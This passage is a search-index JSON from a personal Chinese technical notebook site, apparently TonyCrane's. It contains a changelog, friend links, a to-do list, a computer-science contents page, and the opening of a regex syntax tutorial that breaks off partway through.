{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"o(\u3003'\u25bd'\u3003)o Hi!","text":"<p>\u8fd9\u91cc\u662f\u9e64\u7fd4\u4e07\u91cc\uff08TonyCrane\uff09\u7684\u4e2a\u4eba\u7b14\u8bb0\u672c\u54e6\uff01  </p> <p> \u6700\u8fd1\u66f4\u65b0 /   \u670b\u53cb\u4eec! /   \u7ad9\u70b9\u7edf\u8ba1</p> <p>\u9875\u9762\u603b\u6570\uff1a202 \u603b\u5b57\u6570\uff1a369187 \u4ee3\u7801\u5757\u884c\u6570\uff1a21517 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a</p>"},{"location":"changelog/","title":"\u66f4\u65b0\u8bb0\u5f55","text":"<p>Abstract</p> <p>\u611f\u89c9 rss \u4e5f\u4e0d\u592a\u65b9\u4fbf\uff0cgit log \u6211\u5199\u7684\u8fd8\u5f88\u4e71\u5957\uff0c\u6240\u4ee5\u5c31\u5728\u8fd9\u91cc\u6574\u7406\u4e00\u4e2a\u6700\u8fd1\u66f4\u65b0\u7684\u5217\u8868\u5427\u3002</p> <p>\u4e00\u4e9b\u6bd4\u8f83\u5927\u7684\u66f4\u6539\u4f1a\u8bb0\u5728\u8fd9\u91cc\uff0c\u5c0f\u6539\u52a8\u6bd4\u5982\u8bfe\u7a0b\u7b14\u8bb0\u7684\u6bcf\u5468\u66f4\u65b0\u5c31\u5ffd\u7565\u5566\u3002</p> <p>PS\uff1a\u8fd9\u4e2a\u529f\u80fd\u662f\u6211\u81ea\u5df1\u7cca\u7684\u4e00\u4e2a\u63d2\u4ef6\uff0c\u5728  TonyCrane/mkdocs-changelog-plugin\uff0c\u6b22\u8fce\u6765\u7ed9\u6211\u8fd9\u4e2a\u5927\u9e3d\u5b50\u4ea4 PR\uff08</p>"},{"location":"changelog/#2025","title":"2025","text":"2025-08-23\u00b6 <p> DevOps &gt; \u7cfb\u7edf\u8fd0\u7ef4 &gt; GitHub Actions\uff08\u6dfb\u52a0\u4e86 ReviewDog \u76f8\u5173\uff09</p> 2025-08-13\u00b6 <p> Web \u90e8\u5206\u66f4\u540d\u81f3 DevOps\uff0c\u90e8\u5206\u5de5\u5177\u76f8\u5173\u8fc1\u79fb\u81f3\u7cfb\u7edf\u8fd0\u7ef4</p> <p> DevOps &gt; \u7cfb\u7edf\u8fd0\u7ef4 &gt; KVM \u865a\u62df\u673a\u57fa\u672c\u7528\u6cd5</p> <p> DevOps &gt; \u7cfb\u7edf\u8fd0\u7ef4 &gt; NAS \u914d\u7f6e\u8bb0\u5f55\uff08\u4ec5 SMB \u90e8\u5206\uff09</p> 2025-08-07\u00b6 <p> Web &gt; \u7f51\u7edc\u8fd0\u7ef4 &gt; \u5185\u7f51\u7a7f\u900f\u4e0e\u53cd\u5411\u4ee3\u7406\uff08\u6dfb\u52a0\u4e86 IPv6 \u6b63\u5411\u4ee3\u7406\u53ca\u603b\u7ed3\uff09</p> <p> CS &gt; \u547d\u4ee4\u884c\u5de5\u5177 &gt; Docker \u76f8\u5173\u5907\u5fd8\uff08\u6dfb\u52a0\u4e86 compose \u4e0e podman\uff09</p> <p> CS &gt; CI \u5de5\u5177 &gt; GitHub Action \u76f8\u5173\u7528\u6cd5</p> <p> Web &gt; \u524d\u7aef\u6280\u672f &gt; CSS</p> 2025-08-06\u00b6 <p> \u5168\u9762\u66f4\u65b0 mkdocs \u5de5\u5177\u94fe\uff0c\u91c7\u7528\u89c4\u8303\u5316\u914d\u7f6e\u4e0e hooks</p> 2025-07-12\u00b6 <p> Web &gt; \u7f51\u7edc\u8fd0\u7ef4 &gt; \u5185\u7f51\u7a7f\u900f\u4e0e\u53cd\u5411\u4ee3\u7406\uff08\u6dfb\u52a0\u4e86 atrust \u53ca\u6b63\u5411\u4ee3\u7406\uff09</p>"},{"location":"changelog/#2024","title":"2024","text":"2024-12-01\u00b6 <p> Web &gt; \u7f51\u7edc\u8fd0\u7ef4 &gt; \u57fa\u672c\u914d\u7f6e\u4e0e\u5de5\u5177</p> <p> Web &gt; \u7f51\u7edc\u8fd0\u7ef4 &gt; Web \u670d\u52a1\u5668\u76f8\u5173</p> 2024-11-30\u00b6 <p> Web &gt; \u7f51\u7edc\u8fd0\u7ef4 &gt; Clash \u4ee3\u7406\u914d\u7f6e</p> <p> Web &gt; \u7f51\u7edc\u8fd0\u7ef4 &gt; \u5185\u7f51\u7a7f\u900f\u4e0e\u53cd\u5411\u4ee3\u7406</p> <p> CS &gt; \u547d\u4ee4\u884c\u5de5\u5177 &gt; Shell \u547d\u4ee4\u5907\u5fd8\uff08\u6dfb\u52a0\u4e86 alias/conda/nvim\uff09</p> <p> CS &gt; \u547d\u4ee4\u884c\u5de5\u5177 &gt; Git \u547d\u4ee4\u5907\u5fd8\uff08\u6dfb\u52a0\u4e86 gpg/gh\uff09</p> 2024-09-19\u00b6 <p> CS &gt; \u7f16\u7a0b\u8bed\u8a00 &amp; ISA &gt; RISC-V ISA &gt; spike \u5de5\u5177\u94fe\u76f8\u5173</p> 2024-09-16\u00b6 <p> Security &gt; \u7cfb\u7edf\u5b89\u5168\u8bfe\u7a0b\u5b9e\u9a8c\u62a5\u544a</p> <p> Security &gt; \u7f51\u7edc\u5b89\u5168\u8bfe\u7a0b\u5b9e\u9a8c\u62a5\u544a</p> <p> Security &gt; \u65e0\u7ebf\u4e0e\u7269\u8054\u7f51\u5b89\u5168\u8bfe\u7a0b\u5b9e\u9a8c\u62a5\u544a</p> 2024-04-04\u00b6 <p> CS &gt; \u7f16\u7a0b\u8bed\u8a00 &amp; ISA &gt; \u7f16\u8bd1\u539f\u7406\uff08\u66f4\u65b0\u4e2d\uff09</p> 2024-01-16\u00b6 <p> CS &gt; \u7406\u8bba\u8ba1\u7b97\u673a\u76f8\u5173 &gt; \u8ba1\u7b97\u7406\u8bba\u8bfe\u7a0b\u7b14\u8bb0 \u5b8c\u7ed3\uff01</p> 2024-01-09\u00b6 <p> CS &gt; \u7f16\u7a0b\u8bed\u8a00 &amp; ISA &gt; \u7f16\u7a0b\u8bed\u8a00\u539f\u7406\u8bfe\u7a0b\u7b14\u8bb0 \u5b8c\u7ed3\uff01</p>"},{"location":"changelog/#2023","title":"2023","text":"2023-11-27\u00b6 <p> TPCTF 2023 Writeup</p> 2023-10-26\u00b6 <p> \u5404\u5206\u533a\u9996\u9875 UI \u5927\u66f4\u65b0\uff01</p> 2023-09-28\u00b6 <p> CS &gt; \u7406\u8bba\u8ba1\u7b97\u673a\u76f8\u5173 &gt; \u8ba1\u7b97\u7406\u8bba\u8bfe\u7a0b\u7b14\u8bb0\uff08\u5468\u66f4\u4e2d\uff09</p> 2023-09-27\u00b6 <p> \u4e2d\u6587\u548c\u516c\u5f0f\u6df7\u6392\u7684\u7a7a\u683c\u4e5f\u53ef\u4ee5\u5904\u7406\u4e86\uff01</p> 2023-09-19\u00b6 <p> CS &gt; \u7f16\u7a0b\u8bed\u8a00 &amp; ISA &gt; \u7f16\u7a0b\u8bed\u8a00\u539f\u7406\u8bfe\u7a0b\u7b14\u8bb0\uff08\u5468\u66f4\u4e2d\uff09</p> <p> SECCON 2023 Quals Writeup</p> 2023-08-08\u00b6 <p> Others &gt; \u5b57\u5e55\u5236\u4f5c\u7cfb\u5217 \u5171\u56db\u4e2a\u9875\u9762</p> 2023-08-06\u00b6 <p> \u4e0a\u4f20\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162 \u5b9e\u9a8c\u62a5\u544a</p> <p> \u4e0a\u4f20\u8f6f\u4ef6\u5b89\u5168\u5b9e\u9a8c\u62a5\u544a</p> <p> \u5220\u9664 ADS\uff0c\u91cd\u6784 HPC \u90e8\u5206\u76ee\u5f55\u7ed3\u6784\uff0cTOC \u6dfb\u52a0\u8bfe\u7a0b\u7b14\u8bb0/\u5b9e\u9a8c\u62a5\u544a\u6807\u7b7e</p> 2023-06-20\u00b6 <p> CS &gt; \u7f16\u7a0b\u8bed\u8a00 &amp; ISA &gt; C/C++ &gt; oop\uff08\u671f\u672b\u590d\u4e60\uff09</p> 2023-06-19\u00b6 <p> Security &gt; \u5bc6\u7801\u5b66\uff08\u671f\u672b\u590d\u4e60\uff09</p> 2023-05-29\u00b6 <p> CISCN 2023 Quals Writeup</p> 2023-05-22\u00b6 <p> CS &gt; \u7f16\u7a0b\u8bed\u8a00 &amp; ISA &gt; RISC-V ISA &gt; \u9875\u8868\u76f8\u5173\u7279\u6743\u7ea7\u67b6\u6784</p> 2023-05-10\u00b6 <p> CS &gt; \u7f16\u7a0b\u8bed\u8a00 &amp; ISA &gt; C/C++ &gt; oop\uff08\u671f\u4e2d\u590d\u4e60\uff09</p> <p> CS &gt; \u7f16\u7a0b\u8bed\u8a00 &amp; ISA &gt; RISC-V ISA</p> 2023-04-25\u00b6 <p> RCTF 2022 Writeup</p> <p> SECCON 2022 Final Writeup</p> <p> XCTF 2022 Final Writeup</p> <p> Midnight Sun CTF 2023 Quals Writeup</p> <p> AliyunCTF 2023 Writeup</p> 2023-02-27\u00b6 <p> \u65b0\u5b66\u671f\uff01\u5efa\u7acb\u4e86\u7cfb\u7edf\u2162\u3001\u5bc6\u7801\u5b66\u3001oop\u3001ads \u7684\u7b14\u8bb0\u6846\u67b6</p> <p> CS &gt; \u7f16\u7a0b\u8bed\u8a00 &amp; ISA &gt; Chisel</p> <p> \u91cd\u6784\u4e86 C/C++ \u90e8\u5206\u9875\u9762\u7ed3\u6784</p> 2023-02-24\u00b6 <p> \u4e0a\u4f20\u4e86\u666e\u7269\u4e8c\u548c\u6982\u7387\u8bba\u7684\u624b\u5199\u7b14\u8bb0</p> <p> \u66f4\u65b0\u4e86 CTF \u90e8\u5206\u9875\u9762\u7ed3\u6784</p> <p> \u589e\u52a0\u4e86\u66f4\u65b0\u94fe\u63a5\u7ed3\u6784\u540e\u5411\u540e\u517c\u5bb9\u91cd\u5b9a\u5411\u7684\u529f\u80fd</p> 2023-02-20\u00b6 <p> SadServers Writeup \u66f4\u65b0\u4e86\u65b0\u7684\u4e09\u9053\u9898\u76ee</p> <p> \u4e3b\u9875\u589e\u52a0\u4e86\u968f\u673a\u5361\u7247\uff01</p> 2023-02-02\u00b6 <p> \u589e\u52a0\u6bcf\u9875\u7684\u5b57\u6570\u7edf\u8ba1\u548c\u9605\u8bfb\u65f6\u95f4\u4f30\u8ba1</p> 2023-02-01\u00b6 <p> CS &gt; \u8ba1\u7b97\u673a\u7cfb\u7edf &gt; \u5357\u4eac\u5927\u5b66 ICS PA \u5b9e\u9a8c\u7eaa\u5b9e</p> 2023-01-10\u00b6 <p> CS &gt; \u4eba\u5de5\u667a\u80fd\u76f8\u5173 &gt; \u4eba\u5de5\u667a\u80fd\u57fa\u7840</p> 2023-01-06\u00b6 <p> \u4e0a\u4f20\u4e86\u7a0b\u5e8f\u8bbe\u8ba1\u8f85\u5b66\u5e38\u95ee\u9898\u76ee\u96c6\u53ca\u89e3\u6790</p> <p> \u66f4\u65b0\u4e86\u4e00\u4e9b\u5173\u4e8e\u5b57\u4f53\u5927\u5c0f\u7684\u8bbe\u7f6e</p> 2023-01-02\u00b6 <p> CS &gt; \u7b97\u6cd5\u76f8\u5173 &gt; \u6570\u636e\u7ed3\u6784\u57fa\u7840 &gt; \u57fa\u7840\u6570\u636e\u7ed3\u6784</p> <p> CS &gt; \u7b97\u6cd5\u76f8\u5173 &gt; \u6570\u636e\u7ed3\u6784\u57fa\u7840 &gt; \u6392\u5e8f\u4e0e\u54c8\u5e0c</p> 2023-01-01\u00b6 <p> \u9996\u9875\u7edf\u8ba1\u4fe1\u606f\u589e\u52a0\u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4</p> <p> \u5b57\u4f53\u6539\u7528\u4e2a\u4eba CDN</p>"},{"location":"changelog/#2022","title":"2022","text":"2022-12-24\u00b6 <p> SadServers Writeup \u66f4\u65b0\u4e86\u65b0\u7684\u4e24\u9053\u9898\u76ee</p> 2022-12-16\u00b6 <p> Web &gt; \u6392\u7248\u5199\u4f5c\u89c4\u8303 &gt; \u4e2d\u6587\u6392\u7248\u9700\u6c42</p> <p> Web &gt; \u6392\u7248\u5199\u4f5c\u89c4\u8303 &gt; \u4e2d\u6587\u6280\u672f\u6587\u6863\u98ce\u683c\u6307\u5357</p> 2022-12-15\u00b6 <p> \u66f4\u65b0\u4e86\u4e00\u4e9b index\uff0c\u65b0\u589e\u4e86 Security\u3001Web \u4e24\u4e2a\u5206\u533a</p> <p> \u5f15\u5165\u4e86\u5fc3\u5fc3\u5ff5\u5ff5\u7684 heti\uff0c\u5b9e\u73b0\u4e86\u56db\u5206\u5bbd\u6df7\u6392\u7a7a\u683c\u4ee5\u53ca\u6807\u70b9\u6324\u538b</p> 2022-12-06 ~ 2022-12-10\u00b6 <p> \u66f4\u65b0\u4e86\u7cfb\u5217\u7cfb\u7edf \u2161 \u7b14\u8bb0</p> 2022-12-03\u00b6 <p> CTF &gt; Blockchain &gt; Ethereum &gt; Solidity \u8bed\u8a00</p> 2022-12-02\u00b6 <p> CTF &gt; Blockchain &gt; Ethereum &gt; ERC \u6807\u51c6</p> <p> CTF &gt; Blockchain &gt; Ethereum &gt; Yul \u8bed\u8a00</p> 2022-12-01\u00b6 <p> \u4e3b\u9875\u589e\u52a0\u7ad9\u70b9\u7edf\u8ba1\u4fe1\u606f</p> <p> CTF &gt; Blockchain &gt; Ethereum &gt; \u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5</p> <p> CTF &gt; Blockchain &gt; Ethereum &gt; \u5176\u4f59\u91cd\u8981 EIPs</p> <p> CTF &gt; Blockchain &gt; Ethereum &gt; ERC \u6807\u51c6</p> 2022-11-30\u00b6 <p> \u6dfb\u52a0\u6700\u8fd1\u66f4\u65b0\u90e8\u5206</p> 2022-11-29\u00b6 <p> CTF &gt; Blockchain &gt; Ethereum &gt; \u4ee5\u592a\u574a\u865a\u62df\u673a</p> <p> \u65b0\u589e\u7cfb\u7edf I\u3001II \u5b9e\u9a8c\u62a5\u544a</p> 2022-11-28\u00b6 <p> CS &gt; ISA &gt; RISC-V ISA &gt; \u7279\u6743\u7ea7 ISA</p> <p> CS &gt; ISA &gt; RISC-V ISA &gt; \u975e\u7279\u6743\u7ea7 ISA</p> <p> CTF &gt; Blockchain &gt; Ethereum &gt; \u4ee5\u592a\u574a\u57fa\u7840</p> 2022-11-25\u00b6 <p> \u6dfb\u52a0\u53cb\u94fe\u90e8\u5206</p> <p> \u91cd\u6784 CS &gt; ISA &gt; RISC-V ISA \u90e8\u5206</p> 2022-11-13\u00b6 <p> SECCON 2022 Quals Writeup</p> 2022-11-07\u00b6 <p> CS &gt; \u5de5\u5177 &gt; \u547d\u4ee4\u884c\u5de5\u5177 &gt; Docker \u76f8\u5173\u5907\u5fd8</p> <p> CS &gt; \u5de5\u5177 &gt; \u547d\u4ee4\u884c\u5de5\u5177 &gt; gdb \u76f8\u5173\u5907\u5fd8</p> <p> CS &gt; \u5de5\u5177 &gt; \u547d\u4ee4\u884c\u5de5\u5177 &gt; Shell \u547d\u4ee4\u5907\u5fd8</p> <p> CTF &gt; \u53d6\u8bc1 &gt; \u5185\u5b58\u53d6\u8bc1</p> <p> Others &gt; TroubleShooting &gt; macOS TroubleShooting</p> <p> N1CTF 2022 Writeup</p> 2022-11-03\u00b6 <p> SadServers Writeup</p>"},{"location":"links/","title":"\u53cb\u94fe","text":"<p>Abstract</p> <p>\u4e00\u4e9b\u670b\u53cb\u4eec\u7684\u7b14\u8bb0\u672c\uff01</p> Isshiki\u4fee's Notebook \u4fee\u4f6c tql\uff01 \u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4 \u4e00\u4e2a\u597d\u602a\u7684\u5b66\u957f\uff08\u5212\u6389 widcardw \u7684\u7b14\u8bb0 wid \u597d\u5f3a\uff0c\u7b14\u8bb0\u597d\u597d\u770b chenyuan \u7684\u6280\u672f\u7b14\u8bb0\u672c \\cydl/\\cydl/\\cydl/ yhwu_is's Notes wyy! \u6211\u6ef4\u8d85\u4eba FFox's Notes kami\u2757\ufe0f HobbitQia \u7684\u7b14\u8bb0\u672c \u4f60\u662f\u2753 \u60a8\u2757\ufe0f Bowling's TechStack \u5f3a\u5f97\u6050\u6016\u7684\u5b66\u5f1f \u514b\u745e\u5947\u7684\u7b14\u8bb0\u672c \u4e5f\u662f\u4e00\u4e2a\u597d\u5f3a\u7684\u5b66\u957f/\u62dc\u8c22 Matheart's Note \u662f\u6570\u5fc3\u8036\uff08\u5927\u80a5\u9e3d\u5b50\u597d\u4e45\u6ca1\u66f4\u65b0\u4e86 GZTime's Blog \u8fd9\u4e2a\u61d2\u86cb\u8fd8\u6ca1\u641e note \u70e7\u98ce\u7684\u535a\u5ba2 \u4e00\u4e2a\u5f88\u5f3a\u7684 up \u4e3b@\u70e7\u98ce"},{"location":"todo/","title":"\u4ee3\u529e\u4e8b\u9879","text":""},{"location":"todo/#_2","title":"\u5efa\u7ad9\u7c7b","text":"List <ul> <li> nav \u680f\u989c\u8272</li> <li> \u6697\u8272\u4e3b\u9898</li> <li> \u5b57\u4f53\u5927\u5c0f</li> <li> h1 h2 \u7684 font-weight\uff08\u8c8c\u4f3c\u624b\u673a\u4e0a\u6ca1\u95ee\u9898\uff1f\uff09</li> <li> \u884c\u8ddd</li> <li> \u4fee\u516c\u5f0f\u6e32\u67d3</li> <li> \u4e3b\u9875\u3001\u5173\u4e8e</li> <li> \u9875\u811a\u7248\u6743\u4fe1\u606f</li> <li> \u9875\u811a\u8054\u7cfb\u65b9\u5f0f</li> <li> \u94fe\u63a5 GitHub \u4ed3\u5e93</li> <li> tasklist \u6837\u5f0f</li> <li> \u642c\u8fd0\u535a\u5ba2<ul> <li> \u4e8c\u7ef4\u7801</li> <li> Haskell</li> <li> hackergame writeup</li> <li> \u642c\u51e0\u4e2a\u6bd4\u8d5b\u7684 writeup</li> </ul> </li> <li> \u5efa\u7acb writeup \u5206\u533a</li> <li> \u5efa\u7acb \u8ba1\u7b97\u673a \u5206\u533a</li> <li> \u90e8\u7f72\u5230\u4e91\u670d\u52a1\u5668 \uff08\u6682\u4e0d\u6253\u7b97\uff09</li> <li> \u5de6\u4e0a\u89d2 logo</li> <li> \u5b8c\u5584 css</li> <li> \u7ed1\u5b9a\u57df\u540d</li> <li> \u516c\u5f00 repo</li> <li> \u663e\u793a\u6700\u540e\u4fee\u6539\u65f6\u95f4</li> <li> GitHub repo \u6dfb\u52a0 README</li> <li> \u624b\u673a\u7aef\u989c\u8272\u95ee\u9898</li> <li> \u4ee3\u7801\u5757\u80cc\u666f\u548c\u535a\u5ba2\u540c\u6b65</li> <li> \u4ee3\u7801\u914d\u8272\u65b9\u6848\u548c\u535a\u5ba2\u540c\u6b65 \uff08\u4e0d\u5fc5\u540c\u6b65\uff09</li> <li> \u81ea\u52a8\u6697\u8272</li> <li> \u6dfb\u52a0 icons \u548c emojis  </li> <li> \u53f3\u4fa7 toc \u6df1\u5ea6\u8c03\u6574</li> <li> \u5de6\u4fa7 nav \u6df1\u5ea6\u8c03\u6574</li> <li> \u4e3a\u6bcf\u4e2a\u5206\u533a\u6dfb\u52a0 index<ul> <li> cs</li> <li> cs/pl </li> <li> ctf</li> <li> writeups</li> </ul> </li> <li> \u8bbf\u95ee\u7edf\u8ba1<ul> <li> Google Analytics</li> <li> \u767e\u5ea6\u7edf\u8ba1</li> </ul> </li> <li> \u642c\u4e00\u4e9b notion \u4e0a\u7684 misc kb</li> <li> \u628a yml \u5f04\u5e72\u51c0\u4e00\u70b9</li> <li> \u5199\u4e00\u4e0b mkdocs \u7528\u6cd5</li> <li> \u6807\u9898\u524d\u7f00\u6570\u5b57</li> <li> \u642d\u4e2a\u7f51\u76d8</li> <li> \u6587\u4ef6\u94fe\u63a5</li> </ul>"},{"location":"todo/#_3","title":"\u5de5\u5177\u7c7b","text":"<ul> <li> \u4fee\u6539 mkdocs \u6e90\u7801\uff0c\u52a0\u5feb\u9884\u89c8\u6784\u5efa\u901f\u5ea6</li> <li> \u4f7f\u7528 rich \u7f8e\u5316 log \u8f93\u51fa</li> <li> \u6539\u5584 encryption \u63d2\u4ef6</li> </ul>"},{"location":"todo/#_4","title":"\u7b14\u8bb0\u7c7b","text":"<ul> <li> x86 \u6c47\u7f16\u8bed\u8a00<ul> <li> \u8865\u5145 186\uff5e386 \u6307\u4ee4</li> <li> \u8865\u5145 fl \u5f71\u54cd</li> </ul> </li> <li> RISC-V \u6c47\u7f16\u8bed\u8a00<ul> <li> \u8865\u5145\u6269\u5c55\u6307\u4ee4\u96c6\u6307\u4ee4</li> </ul> </li> <li> \u68c0\u67e5\u5404 index</li> <li> \u7cfb\u7edf\u4e00\u76f8\u5173<ul> <li> \u7406\u8bba\u8bfe</li> <li> lab</li> </ul> </li> <li> \u7cfb\u7edf\u4e8c\u76f8\u5173<ul> <li> \u8865\u4e00\u4e0b\u524d\u4e24\u8282\u8bfe\u7684\u7b14\u8bb0</li> </ul> </li> <li> CTF ETH<ul> <li> \u57fa\u7840\u77e5\u8bc6</li> <li> \u5e38\u89c1\u6f0f\u6d1e</li> </ul> </li> <li> Python \u76f8\u5173<ul> <li> Lecture \u6587\u5b57\u7248</li> <li> NumPy</li> <li> PIL</li> <li> matplotlib</li> </ul> </li> <li> HPC<ul> <li> SIMD</li> <li> ML</li> </ul> </li> <li> \u5efa\u7acb\u8bfe\u7a0b\u7b14\u8bb0\u9875\u9762<ul> <li> \u4eba\u5de5\u667a\u80fd\u57fa\u7840</li> <li> \u6570\u636e\u7ed3\u6784\u57fa\u7840</li> </ul> </li> <li> \u5de5\u5177<ul> <li> index</li> <li> docker</li> <li> GitHub Action</li> <li> Git</li> </ul> </li> <li> Writeups<ul> <li> TCTF NFT</li> <li> \u5f3a\u7f51\u676f\u789f\u5f71\u91cd\u91cd</li> </ul> </li> <li> Rust</li> <li> \u6e90\u7801\u5256\u6790<ul> <li> index</li> <li> mkdocs</li> </ul> </li> <li> log4j \u6f0f\u6d1e\u590d\u73b0\u5b58\u4e2a\u6863</li> </ul>"},{"location":"cs/","title":"Computer Science","text":"<p>Abstract</p> <p>\u8fd9\u91cc\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u76f8\u5173\u5185\u5bb9\u7684\u7b14\u8bb0</p> <p>\u6709\u7684\u662f\u81ea\u5b66\u7684\u7b14\u8bb0\uff0c\u6709\u7684\u662f\u8bfe\u7a0b\u7b14\u8bb0</p>"},{"location":"cs/#table-of-contents","title":"Table of Contents","text":"\u8ba1\u7b97\u673a\u7c7b\u8bfe\u7a0b\u7b14\u8bb0          <ul> <li> \u7f16\u8bd1\u539f\u7406  4607  20  15 mins              1712644474 </li> <li> \u8ba1\u7b97\u673a\u7cfb\u7edf\u8d2f\u901a\u7cfb\u5217  60680  3359  246 mins              1712166309 </li> <li> \u8ba1\u7b97\u7406\u8bba  19923  66 mins              1705392298 </li> <li> \u7f16\u7a0b\u8bed\u8a00\u539f\u7406  11836  31  39 mins              1705392298 </li> <li> HPC 101 \u8d85\u7b97\u5c0f\u5b66\u671f  9976  364  38 mins              1691330648 </li> <li> \u4eba\u5de5\u667a\u80fd\u57fa\u7840  12143  103  42 mins              1683733808 </li> <li> \u5357\u4eac\u5927\u5b66 ICS PA \u5b9e\u9a8c\u7eaa\u5b9e  7092  196  26 mins              1675314461 </li> <li> \u6570\u636e\u7ed3\u6784\u57fa\u7840  6503  337  26 mins              1673188079 </li> </ul> \u7f16\u7a0b\u8bed\u8a00 &amp; ISA          <ul> <li> RISC-V ISA  16147  197  57 mins              1726734314 </li> <li> C/C++  6355  121  23 mins              1683733808 </li> <li> Chisel  1848  38  7 mins              1683733808 </li> <li> Rust  16166  1203  69 mins              1663492066 </li> <li> Python  5670  228  21 mins              1656775384 </li> <li> x86 Assembly  14428  203  51 mins              1656775384 </li> <li> Haskell  17419  1171  73 mins              1655282709 </li> </ul> \u96f6\u6563\u77e5\u8bc6\u70b9          <ul> <li> RegEx \u6b63\u5219\u8868\u8fbe\u5f0f  1941  4  7 mins              1655282709 </li> <li> Unicode \u7edf\u4e00\u7801  2506  8 mins              1655282709 </li> </ul> \u5de5\u5177\u76f8\u5173          <ul> <li> \u5de5\u5177\u6536\u96c6  363  1 mins              1676889437 </li> <li> mkdocs \u4f7f\u7528\u8bb0\u5f55  560  22  2 mins              1663492066 </li> <li> hexo \u4f7f\u7528\u8bb0\u5f55  779  47  3 mins              1663492066 </li> <li> sphinx \u4f7f\u7528\u8bb0\u5f55  268  4  1 mins              1663492066 </li> </ul> \u6e90\u7801\u5256\u6790          <ul> <li> mkdocs \u6e90\u7801\u5256\u6790  1640  135  7 mins              1663601192 </li> </ul>"},{"location":"cs/regex/","title":"\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p> \u7ea6 1937 \u4e2a\u5b57  4 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>\u6b63\u5219\u8868\u8fbe\u5f0f\uff08Regular Expression\uff09\u4f7f\u7528\u5355\u4e2a\u5b57\u7b26\u4e32\u6765\u63cf\u8ff0\u3001\u5339\u914d\u4e00\u7cfb\u5217\u5339\u914d\u67d0\u4e2a\u53e5\u6cd5\u89c4\u5219\u7684\u5b57\u7b26\u4e32\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1</p> <p>Abstract</p> <p>\u6b63\u5219\u8868\u8fbe\u5f0f\u7528\u9014\u5e7f\u6cdb\uff0c\u800c\u4e14\u529f\u80fd\u5f3a\u5927\u53c8\u597d\u7528\u3002\u53ef\u4ee5\u8bf4\u65e2\u7b80\u5355\u53c8\u7e41\u7410\uff0c\u4f46\u662f\u7528\u8d77\u6765\u5f88\u723d</p> <p>\u4e00\u4e9b\u5de5\u5177\uff1a</p> <ul> <li>RegExr \u6b63\u5219\u5728\u7ebf\u6d4b\u8bd5\u5de5\u5177</li> <li>Regulex \u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u89c6\u5316</li> <li>HackerRank regex \u4e60\u9898\u96c6</li> </ul>"},{"location":"cs/regex/#_2","title":"\u8bed\u6cd5","text":""},{"location":"cs/regex/#_3","title":"\u666e\u901a\u5b57\u7b26","text":"<p>\u6240\u6709\u4e0d\u662f\u5143\u5b57\u7b26\u7684\u5b57\u7b26\u90fd\u53ef\u4ee5\u76f4\u63a5\u5199\u51fa\u6765\u7528\u6765\u5339\u914d\uff0c\u6bd4\u5982\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7b26\u53f7\u7b49</p> <p>\u6709\u8bed\u6cd5\u610f\u4e49\u7684\u5b57\u7b26\u9700\u8981\u4f7f\u7528  \u8f6c\u4e49\uff0c\u6bd4\u5982 \\( \\) \\[ \\] \\. \u5206\u522b\u5339\u914d ()[]. \u8fd9\u4e94\u4e2a\u5b57\u7b26</p> \u8bed\u6cd5 \u63cf\u8ff0 [...] \u5339\u914d\u4efb\u610f\u5728 <code>...</code> \u4e2d\u7684\u5b57\u7b26\uff0c\u5982 [ABC] \u5339\u914d\u6240\u6709 A B C \u5b57\u7b26 [^...] \u5339\u914d\u4efb\u610f\u4e0d\u5728 <code>...</code> \u4e2d\u7684\u5b57\u7b26\uff0c\u5982 [^ABC] \u5339\u914d\u9664\u4e86 A B C \u5916\u7684\u6240\u6709\u5355\u4e2a\u5b57\u7b26 [x-y] \u6309\u7167\u987a\u5e8f\u5339\u914d\u4ece <code>x</code> \u5230 <code>y</code> \u5230\u6240\u6709\u5b57\u7b26\uff0c\u5982 [a-z] \u5339\u914d\u6240\u6709\u5c0f\u5199\u5b57\u6bcd\uff0c[A-E] \u5339\u914d A \u5230 E \u8fd9\u4e94\u4e2a\u5b57\u7b26\uff5c . \u5339\u914d\u4efb\u610f\u9664\u4e86\u6362\u884c\u7b26\u4ee5\u5916\u7684\u5b57\u7b26 \\w \u5339\u914d\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\uff0c\u76f8\u5f53\u4e8e [a-zA-Z0-9_] x|y \u5339\u914d <code>x</code> \u6216 <code>y</code>\uff0c\u4f18\u5148\u7ea7\u6700\u4f4e\uff0c\u5982 <code>a|bcd</code> \u5339\u914d a \u6216 bcd"},{"location":"cs/regex/#_4","title":"\u975e\u6253\u5370\u5b57\u7b26","text":"\u8bed\u6cd5 \u63cf\u8ff0 \\cx \u5339\u914d\u7531 x \u6307\u660e\u7684\u63a7\u5236\u5b57\u7b26\uff0cx \u5fc5\u987b\u5c5e\u4e8e [a-zA-Z]\uff0c\u5426\u5219 \\c \u76f4\u63a5\u89c6\u4e3a c\uff0c\u5982 \\cM \u5339\u914d Ctrl-M \u5373\u56de\u8f66\u7b26 \\f \u5339\u914d\u4e00\u4e2a\u6362\u9875\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0c \\cL \\n \u5339\u914d\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0a \\cJ \\r \u5339\u914d\u4e00\u4e2a\u56de\u8f66\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0d \\cM \\t \u5339\u914d\u4e00\u4e2a\u5236\u8868\u7b26\uff0c\u76f8\u5f53\u4e8e \\x09 \\cI \\v \u5339\u914d\u4e00\u4e2a\u5782\u76f4\u5236\u8868\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0b \\cK \\s 